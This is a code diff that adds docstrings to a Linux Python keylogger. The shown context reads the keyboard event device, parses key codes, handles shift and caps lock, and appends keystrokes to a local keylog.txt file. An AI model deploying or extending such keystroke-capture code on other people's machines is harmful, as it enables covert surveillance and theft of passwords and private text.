@@ -22,22 +22,49 @@ special_map = {
 
 class Keylogger:
     def __init__(self):
+        """
+        Initialize the Keylogger instance.
+        """
         self.__status = False
         self.__stop_flag = None
 
     def get_status(self):
+        """
+        Get the current status of the Keylogger.
+
+        Returns:
+            bool: True if the Keylogger is active, False otherwise.
+        """
         return self.__status
 
     def toggle_status(self):
+        """
+        Toggle the status of the Keylogger.
+        """
         self.__status = not self.__status
 
     def get_stop_flag(self):
+        """
+        Get the stop flag for the Keylogger.
+
+        Returns:
+            multiprocessing.synchronize.Event: The stop flag.
+        """
         return self.__stop_flag
 
     def set_stop_flag(self, flag):
+        """
+        Set the stop flag for the Keylogger.
+
+        Args:
+            flag (multiprocessing.synchronize.Event): The stop flag.
+        """
         self.__stop_flag = flag
 
     def start_keylogger(self):
+        """
+        Start the Keylogger process.
+        """
         self.toggle_status()
         create_log_file()
         event_path = get_event_path()
@@ -49,6 +76,12 @@ class Keylogger:
         self.set_stop_flag(stop_flag)
 
     def stop_keylogger(self):
+        """
+        Stop the Keylogger process.
+
+        Returns:
+            int: 0 if successful, -1 otherwise.
+        """
         if type(self.get_stop_flag()) == multiprocessing.synchronize.Event:
             self.get_stop_flag().set()
             self.toggle_status()
@@ -58,6 +91,9 @@ class Keylogger:
 
 
 def create_log_file():
+    """
+    Create the keylog.txt file if it doesn't exist.
+    """
     try:
         f = open('keylog.txt', 'x')
     except FileExistsError:
@@ -68,11 +104,23 @@ def create_log_file():
 
 
 def write_to_log_file(string):
+    """
+    Write a string to the keylog.txt file.
+
+    Args:
+        string (str): The string to write.
+    """
     with open('keylog.txt', 'a') as f:
         f.write(string)
 
 
 def get_event_path():
+    """
+    Get the path to the event file.
+
+    Returns:
+        str: The path to the event file.
+    """
     with open("/proc/bus/input/devices") as f:
         lines = f.readlines()
 
@@ -91,11 +139,28 @@ def get_event_path():
 
 
 def process_line(line):
+    """
+    Process a line from the event file.
+
+    Args:
+        line (str): The line from the event file.
+
+    Returns:
+        re.Match: The matched pattern.
+    """
     pattern = r"Event: time \d+.\d+, type \d+ \(EV_KEY\), code (\d+) \(\w+\), value (\d+)"
     return re.search(pattern, line)
 
 
 def manage_shift_and_caps(shift_key_pressed, capslock_pressed, code):
+    """
+    Manage the shift and capslock keys.
+
+    Args:
+        shift_key_pressed (bool): True if shift key is pressed, False otherwise.
+        capslock_pressed (bool): True if capslock key is pressed, False otherwise.
+        code (int): The key code.
+    """
     if shift_key_pressed and not capslock_pressed:
         if code in special_map.keys():
             write_to_log_file(special_map[code])
